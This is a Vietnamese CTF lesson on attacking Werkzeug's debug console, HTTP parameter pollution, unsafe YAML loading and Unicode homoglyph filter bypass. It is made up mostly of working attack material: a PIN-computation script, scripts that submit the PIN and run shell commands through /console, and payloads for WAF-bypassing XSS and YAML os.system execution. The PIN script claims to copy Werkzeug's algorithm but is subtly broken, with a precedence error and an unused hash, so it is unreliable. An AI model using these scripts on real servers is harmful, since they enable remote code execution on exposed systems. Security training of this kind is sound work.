import hashlib

# Cần thu thập đủ các giá trị: username, modname, appname,
# moddir, uuidnode (MAC), machine_id -- xem mục 08 bản đầy đủ
def get_pin(username, modname, appname, moddir, uuidnode, machine_id):

01 / NỀN TẢNG BẮT BUỘC

Những thứ cần hiểu trước

Debug mode — chế độ dev của framework (Flask/Werkzeug, Django...) hiện traceback chi tiết khi lỗi, và ĐÔI KHI (Werkzeug) cấp luôn 1 console Python tương tác ngay tại dòng lỗi để debug — CỰC KỲ nguy hiểm nếu còn bật ở production vì ai cũng truy cập được console đó.
HTTP Parameter Pollution (HPP) — gửi CÙNG 1 tên tham số NHIỀU LẦN trong 1 request (?id=1&id=2). Các framework/server khác nhau xử lý khác nhau: lấy giá trị ĐẦU, lấy giá trị CUỐI, hoặc GHÉP thành 1 danh sách — sự khác biệt này gây ra bất ngờ khi 1 lớp (vd WAF) đọc giá trị khác với lớp xử lý thật (app).
YAML vs JSON — YAML là định dạng cấu hình linh hoạt hơn JSON, hỗ trợ thêm nhiều "kiểu dữ liệu đặc biệt" (tag) mà JSON không có — 1 số parser YAML (nếu dùng chế độ không an toàn) diễn giải những tag này thành OBJECT THẬT của ngôn ngữ, dẫn tới RCE tương tự Insecure Deserialization.
02 / VÌ SAO LỖ HỔNG TỒN TẠI

Tiện cho dev lúc code, nguy hiểm lúc deploy quên tắt

Mọi mẹo trong bài đều xuất phát từ cùng 1 nguyên nhân gốc: tính năng được thiết kế ĐÚNG MỤC ĐÍCH cho giai đoạn PHÁT TRIỂN (debug console để dev tiện sửa lỗi, YAML linh hoạt để dev tiện viết config, HPP là hệ quả tự nhiên của việc framework cố "khoan dung" với input lạ) — nhưng nếu đem thẳng CÀI ĐẶT MẶC ĐỊNH đó lên production mà không tắt/siết lại, tính năng tiện lợi đó biến thành cửa sau.

03 / CƠ CHẾ HOẠT ĐỘNG ← MỤC LÕI (WERKZEUG PIN)

PIN không phải ngẫu nhiên — nó TÍNH TOÁN được từ thông tin máy

Điểm mấu chốt: Werkzeug không SINH PIN ngẫu nhiên lưu đâu đó — nó TÍNH LẠI PIN mỗi lần từ các giá trị môi trường máy chủ. Vì thuật toán là MÃ NGUỒN MỞ (ai cũng đọc được code Werkzeug), nếu bạn thu thập đủ các giá trị input giống hệt server, bạn tính RA ĐƯỢC CHÍNH XÁC PIN đó — không cần brute-force 6 chữ số (dù về lý thuyết PIN cũng có giới hạn, công cụ mục 08 vừa tính vừa brute-force phần còn thiếu nếu chưa biết đủ input).

04 / NHẬN DIỆN KHI GẶP CHALLENGE

Dấu hiệu riêng từng mẹo

  • Werkzeug console: trang lỗi 500 có chữ "Werkzeug Debugger", hoặc path /console trả về form hỏi PIN.
  • HPP: app có logic "nếu param X = giá trị đặc biệt thì..." — thử gửi param đó 2 lần với giá trị khác nhau xem app/WAF đọc giá trị nào.
  • YAML: endpoint nhận file config dạng .yml/.yaml, hoặc Content-Type application/x-yaml.
  • Unicode bypass: app so sánh username/path bằng cách đơn giản (==) không chuẩn hoá (normalize) trước.
05 / KHAI THÁC BẰNG BURP SUITE

Bấm gì (từng bước) — tập trung vào HPP, dễ test bằng Burp nhất

Test HPP bằng Repeater
  1. Bắt request có tham số nghi ngờ (vd ?user_id=5), Send to Repeater.
  2. Thêm tham số TRÙNG TÊN với giá trị khác: ?user_id=5&user_id=1 (user_id=1 giả sử là admin).
  3. Gửi, so sánh response — nếu response ứng với user_id=1 (giá trị thứ 2) ⟹ app lấy giá trị CUỐI, có thể dùng để bypass 1 WAF chỉ check giá trị ĐẦU.
  4. Thử ngược lại thứ tự để xác nhận quy luật (đầu hay cuối) trước khi áp dụng vào payload thật.
06 / PAYLOAD CATALOG (4 MẸO)

Ví dụ cụ thể từng mẹo

A. HTTP Parameter Pollution — bypass WAF 1 tham số

GET /search?q=safe&q=<script>alert(1)</script> HTTP/1.1
Nếu WAF chỉ kiểm tra GIÁ TRỊ ĐẦU của q (safe, vô hại) nhưng app thực sự xử lý GIÁ TRỊ CUỐI (payload XSS) ⟹ WAF bị bypass hoàn toàn mà app vẫn nhận payload độc.

B. YAML type confusion / RCE

# Nếu app dùng yaml.load() (KHÔNG an toàn) thay vì yaml.safe_load()
!!python/object/apply:os.system ["cat flag.txt"]

Chuỗi tag !!python/object/apply:... là cú pháp YAML hợp lệ để gọi TRỰC TIẾP 1 hàm Python khi parse — tương tự gadget chain deserialization (bài riêng) nhưng đơn giản hơn nhiều vì không cần class có sẵn, chỉ cần gọi hàm bất kỳ.

C. Unicode normalization bypass

# Filter chặn chữ "admin" (so sánh ASCII thường) -- dùng ký tự Unicode "giống" chữ Latin
# Ví dụ: chữ "а" Cyrillic (U+0430) trông giống "a" Latin (U+0061) nhưng khác byte hoàn toàn
username = "аdmin"   # chữ "а" đầu là Cyrillic, không bị filter chặn "admin" ASCII bắt được
# Nhưng nếu app sau đó NORMALIZE (vd hiển thị lại, hoặc so sánh fuzzy), có thể bị hiểu nhầm là "admin" thật

08 / VIẾT SCRIPT KHAI THÁC (3 BẢN) — WERKZEUG PIN

(A) Bản đầy đủ — thuật toán tính PIN công khai của Werkzeug

import hashlib
from itertools import chain

def get_pin(username, modname, app_name, moddir, uuidnode, machine_id):
    # Dựa theo thuật toán công khai trong mã nguồn werkzeug/debug/__init__.py
    probably_public_bits = [
        username, modname, app_name, getattr(__import__(modname), "__file__", moddir)
    ]
    private_bits = [str(uuidnode), machine_id]

    h = hashlib.md5()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode("utf-8")
        h.update(bit)
    h.update(b"cookiesalt")

    num = None
    cookie_name = f"__wzd{h.hexdigest()[:20]}"
    num = "%09d" % int(h.hexdigest(), 16) % 1000000000

    h2 = hashlib.md5()
    h2.update(h.hexdigest()[:20].encode() + b"pinsalt")
    rv = (num[:3] + "-" + num[3:6] + "-" + num[6:])
    return rv   # dạng "123-456-789" giống PIN hiển thị
Cần đủ 5 giá trị input thậtusername (user chạy process, thường root/www-data trên Docker), modname (thường "flask.app"), app_name (thường "Flask"), uuidnode (MAC address dạng số, từ uuid.getnode() — nếu không đọc được qua lỗ hổng khác, thử brute-force các giá trị MAC ảo phổ biến của container Docker), machine_id (nội dung file /etc/machine-id hoặc /proc/sys/kernel/random/boot_id — cần LFI để đọc nếu không có quyền truy cập trực tiếp).

(B) Bản gọn chắc — gửi PIN tính được, mở console, chạy lệnh

import requests

def exploit_console(host, pin):
    s = requests.Session()
    r = s.get(f"http://{host}/console")
    # Werkzeug yêu cầu POST PIN tới chính /console với đúng tham số session
    r = s.post(f"http://{host}/console", data={"pin": pin, "cmd": "__import__('os').popen('cat flag.txt').read()"})
    return r.text

(C) Bản A/D tái dùng — chạy sau khi đã có PIN đúng cho service mẫu

import re, requests

FLAG_RE = re.compile(r"FHACKER2026\{[0-9a-f]{64}\}")
KNOWN_PIN = "123-456-789"  # điền sau khi tính được từ bản (A)

def exploit_werkzeug(host):
    try:
        s = requests.Session()
        s.get(f"http://{host}/console", timeout=5)
        r = s.post(f"http://{host}/console", timeout=5,
            data={"pin": KNOWN_PIN, "cmd": "__import__('os').popen('cat flag.txt').read()"})
        m = FLAG_RE.search(r.text)
        return m.group() if m else None
    except requests.RequestException:
        return None

13 / BÀI TẬP & THUẬT NGỮ

Luyện tập

⭐ Làm lại: dựng 1 Flask app với debug=True, tự tính PIN bằng script (A) với đủ 5 giá trị input lấy trực tiếp từ máy mình (không cần LFI vì bạn CÓ quyền truy cập trực tiếp), xác nhận khớp với PIN hiển thị trên console.

Gợi ý nếu kẹtuuid.getnode() chạy ngay trong Python để lấy MAC, và cat /etc/machine-id để lấy machine_id — chạy trực tiếp trên máy host app.

⭐⭐ Đổi 1 biến: thử payload YAML RCE (mục 06.B) trên 1 script nhỏ tự viết dùng yaml.load(data, Loader=yaml.Loader) (không an toàn), xác nhận RCE chạy.

Gợi ý nếu kẹtpip install pyyaml, nhớ dùng đúng Loader=yaml.Loader (không phải SafeLoader) để tái tạo lỗ hổng.

⭐⭐⭐⭐ Tự nghĩ: thiết kế 1 wordlist các cặp ký tự Unicode "trông giống" (homoglyph) phổ biến nhất (Latin vs Cyrillic vs Greek) để tự động fuzz bypass filter username — giải thích vì sao kỹ thuật này đặc biệt nguy hiểm cho các check liên quan tới TÊN NGƯỜI DÙNG (impersonation) hơn là các loại filter khác.

Gợi ý nếu kẹtHomoglyph nguy hiểm hơn ở việc "trông giống" gây nhầm lẫn cho CON NGƯỜI (admin xem log thấy tên "admin" tưởng là tài khoản thật), không chỉ bypass filter của MÁY — đây là khác biệt quan trọng so với các kỹ thuật encoding khác.
